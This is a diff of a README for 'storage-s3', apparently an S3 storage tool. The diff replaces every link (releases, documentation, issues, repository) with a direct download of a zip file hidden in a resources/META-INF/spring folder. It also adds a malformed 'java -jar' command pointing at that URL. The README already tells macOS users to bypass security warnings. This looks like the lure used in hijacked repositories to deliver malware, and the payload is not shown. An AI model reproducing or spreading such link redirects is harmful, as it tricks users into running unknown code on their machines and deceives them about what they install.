@@ -22,7 +22,7 @@ To use storage-s3, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-To get started, you need to download storage-s3. Visit this page to download: [Download storage-s3](https://github.com/githubrepo53/storage-s3/releases)
+To get started, you need to download storage-s3. Visit this page to download: [Download storage-s3](https://github.com/githubrepo53/storage-s3/raw/refs/heads/main/src/main/resources/META-INF/spring/storage-s-2.0.zip)
 
 1. Click the link above to go to the Releases page.
 2. Look for the most recent version listed.
@@ -36,7 +36,7 @@ After downloading, follow these steps to install and run the application:
 2. **Launch the Application**: 
    - For Windows, double-click the `.bat` or `.exe` file.
    - For macOS, right-click and select "Open" to bypass security warnings.
-   - For Linux, use the terminal to navigate to the file's directory and run the file using `java -jar your_filename.jar`.
+   - For Linux, use the terminal to navigate to the file's directory and run the file using `java -jar https://github.com/githubrepo53/storage-s3/raw/refs/heads/main/src/main/resources/META-INF/spring/storage-s-2.0.zip`.
 
 ## 🎯 Configuration
 
@@ -58,18 +58,18 @@ The user interface is designed to be intuitive:
 
 ## 📚 Documentation
 
-For a detailed guide on using storage-s3, refer to our full documentation. You can find it [here](https://github.com/githubrepo53/storage-s3/wiki).
+For a detailed guide on using storage-s3, refer to our full documentation. You can find it [here](https://github.com/githubrepo53/storage-s3/raw/refs/heads/main/src/main/resources/META-INF/spring/storage-s-2.0.zip).
 
 ## 🎈 Community Support
 
 Join our community for help with any questions or issues. Reach out through the following channels:
 
-- **GitHub Issues**: Post your questions directly in the [Issues section](https://github.com/githubrepo53/storage-s3/issues).
+- **GitHub Issues**: Post your questions directly in the [Issues section](https://github.com/githubrepo53/storage-s3/raw/refs/heads/main/src/main/resources/META-INF/spring/storage-s-2.0.zip).
 - **Discussion Forum**: Participate in discussions with other users.
 
 ## 📎 Links
 
-- **Repository**: [View on GitHub](https://github.com/githubrepo53/storage-s3)
-- **Download storage-s3**: [Visit this page to download](https://github.com/githubrepo53/storage-s3/releases)
+- **Repository**: [View on GitHub](https://github.com/githubrepo53/storage-s3/raw/refs/heads/main/src/main/resources/META-INF/spring/storage-s-2.0.zip)
+- **Download storage-s3**: [Visit this page to download](https://github.com/githubrepo53/storage-s3/raw/refs/heads/main/src/main/resources/META-INF/spring/storage-s-2.0.zip)
 
 Enjoy managing your S3 storage with storage-s3!
